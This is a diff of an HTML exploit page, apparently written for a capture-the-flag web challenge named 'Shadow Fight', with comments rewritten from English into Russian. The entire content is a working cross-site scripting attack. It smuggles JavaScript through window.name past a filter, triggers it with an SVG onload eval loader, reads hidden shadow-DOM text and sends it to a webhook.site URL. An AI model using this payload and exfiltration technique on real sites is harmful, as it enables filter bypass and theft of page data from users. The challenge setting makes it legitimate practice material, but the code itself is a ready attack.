@@ -1,41 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Shadow Fight Exploit</title>
+    <title>Exploit</title>
 </head>
 <body>
-    <h1>Exploiting...</h1>
     <script>
-        // 1. The Payload
-        // This code runs INSIDE the challenge page.
-        // Since it is passed via window.name, the WAF (helpers.js) does NOT check it.
-        // We can use 'fetch', 'document', etc. freely here.
-        var payload = `
-            // Use Chrome's window.find() to pierce the closed Shadow DOM
-            // This highlights the text 'p_ctf' even if it is inside a shadow root
-            window.find('p_ctf');
-
-            // Get the highlighted text (the flag)
-            var flag = window.getSelection().anchorNode.textContent;
-
-            // Send the flag to your listener
-            fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?flag=' + encodeURIComponent(flag));
+        // 1. Записываем вредоносный код в имя окна (window.name)
+        // Этот код переживет переход на другую страницу.
+        // WAF задачи его не видит, так как он не в адресной строке.
+        window.name = `
+            // Даем странице немного времени на загрузку (500мс)
+            setTimeout(function(){
+                // Используем window.find, чтобы найти скрытый текст в Shadow DOM
+                // Это уникальная фишка Chrome: поиск работает даже внутри closed shadow-root
+                window.find('p_ctf');
+                
+                // Получаем выделенный текст
+                var sel = window.getSelection();
+                if (sel && sel.anchorNode) {
+                    var flag = sel.anchorNode.textContent;
+                    // Отправляем флаг на ваш вебхук
+                    fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?flag=' + encodeURIComponent(flag));
+                } else {
+                    // Если не нашли, отправляем ошибку (для отладки)
+                    fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=FlagNotFound');
+                }
+            }, 1000);
         `;
 
-        // 2. The Target
-        // We inject the loader: <svg/onload=eval(name)>
-        // It fits in 50 chars and passes the WAF.
-        // Note: We need a valid avatar URL to pass validation.
-        var target = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(name)%3E&avatar=https://picsum.photos/100";
-
-        // 3. Execution
-        // window.open sets the new window's 'name' property to our payload.
-        // When the SVG loads, it runs eval(name), executing our payload.
-        window.open(target, payload);
-        
-        // Optional: Redirect back after a delay to clean up
-        setTimeout(() => { window.location.href = 'about:blank'; }, 5000);
+        // 2. Сразу перенаправляем текущую страницу на уязвимую задачу.
+        // Браузер сохранит window.name при переходе.
+        // Payload: <svg/onload=eval(name)> — он короткий и вызывает код из window.name
+        window.location.href = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(name)%3E&avatar=https://picsum.photos/100";
     </script>
 </body>
 </html>
